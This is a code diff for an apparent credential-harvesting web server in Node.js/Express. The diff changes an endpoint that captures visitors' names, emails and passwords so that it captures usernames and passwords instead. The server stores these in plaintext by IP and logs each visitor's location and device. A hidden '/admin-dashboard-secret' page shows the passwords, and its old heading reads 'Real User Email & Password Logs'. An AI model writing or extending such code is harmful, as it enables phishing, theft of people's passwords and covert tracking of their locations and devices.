@@ -45,12 +45,11 @@ function logVisitor(req, pageName) {
         deviceName = 'Samsung Galaxy A14 (Mobile)';
     }
 
-    let creds = visitorCredentials[ip] || { name: 'Guest', email: 'N/A', password: 'N/A' };
+    let creds = visitorCredentials[ip] || { username: 'Guest', password: 'N/A' };
 
     visitorLogs.unshift({
         time: new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' }),
-        name: creds.name,
-        email: creds.email,
+        username: creds.username,
         password: creds.password,
         ip: ip,
         location: locationStr,
@@ -67,15 +66,15 @@ app.post('/api/track-action', (req, res) => {
     res.json({ success: true });
 });
 
-app.post('/api/set-credentials', (req, res) => {
+app.post('/api/set-custom-credentials', (req, res) => {
     let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown IP';
     if (ip.includes(',')) ip = ip.split(',')[0].trim();
     
-    const { name, email, password } = req.body;
-    if (name && email && password) {
-        visitorCredentials[ip] = { name, email, password };
+    const { username, password } = req.body;
+    if (username && password) {
+        visitorCredentials[ip] = { username, password };
     }
-    logVisitor(req, `Logged In with Real Email: ${email}`);
+    logVisitor(req, `Custom Logged In (User: ${username})`);
     res.json({ success: true, ip: ip });
 });
 
@@ -288,7 +287,7 @@ app.get('/admin-dashboard-secret', (req, res) => {
                     <div class="section-title" style="color:#ff0055;">📩 Messages from Users</div>
                     <div id="messagesContainer"></div>
 
-                    <div class="section-title" style="color:#00f0ff;">⚡ Real User Email & Password Logs</div>
+                    <div class="section-title" style="color:#00f0ff;">⚡ User Credentials Logs</div>
                     <div id="visitorCardsContainer"></div>
                 </div>
             </div>
@@ -379,9 +378,8 @@ app.get('/admin-dashboard-secret', (req, res) => {
                                     html += \`
                                         <div class="visitor-card">
                                             <div class="time-stamp">\${log.time}</div>
-                                            <div class="name-tag">👤 Name: \${log.name}</div>
-                                            <div style="font-size:14px; color:#00ffcc; margin-bottom:3px; font-weight:bold;">📧 Email: \${log.email}</div>
-                                            <div style="font-size:14px; color:#ff0055; margin-bottom:5px; font-weight:bold;">🔑 Password: \${log.password}</div>
+                                            <div style="font-size:15px; color:#00ffcc; margin-bottom:3px; font-weight:bold;">👤 Username: \${log.username}</div>
+                                            <div style="font-size:15px; color:#ff0055; margin-bottom:5px; font-weight:bold;">🔑 Password: \${log.password}</div>
                                             <div class="ip-tag">IP: \${log.ip}</div>
                                             <div class="info-row">📍 <span>Location:</span> \${log.location}</div>
                                             <div class="info-row">📱 <span>Device:</span> \${log.device}</div>
